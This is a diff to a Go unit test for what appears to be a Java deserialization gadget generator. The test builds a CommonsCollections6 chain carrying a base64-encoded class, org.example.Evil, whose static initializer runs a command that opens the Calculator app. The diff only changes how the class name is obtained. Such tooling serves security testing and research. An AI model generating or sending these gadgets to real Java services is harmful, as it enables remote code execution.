@@ -205,9 +205,20 @@ func TestMUSTPASSSetMajorVersion(t *testing.T) {
 
 func TestGenerateGadget_ByteArrayReplace(t *testing.T) {
 	param := map[string]string{
-		"className":   "org.example.Evil",
 		"base64Class": "yv66vgAAADQAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvRXZpbDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwACQAKBwAgDAAhACIBABJvcGVuIC1hIENhbGN1bGF0b3IMACMAJAEAE2phdmEvbGFuZy9FeGNlcHRpb24MACUACgEAEG9yZy9leGFtcGxlL0V2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAMADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAGAAkACQAMAAcADQAIABEACgANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW",
 	}
+	classBytes, err := base64.StdEncoding.DecodeString(param["base64Class"])
+	if err != nil {
+		t.Errorf("DecodeString() error = %v", err)
+		return
+	}
+	classIns, err := javaclassparser.Parse(classBytes)
+	if err != nil {
+		t.Errorf("Parse() error = %v", err)
+		return
+	}
+	className := classIns.GetClassName()
+	param["className"] = className
 	obj, err := GenerateGadget(string(GadgetCommonsCollections6), "mozilla_defining_class_loader", param)
 	if err != nil {
 		t.Errorf("GenerateGadget() error = %v", err)
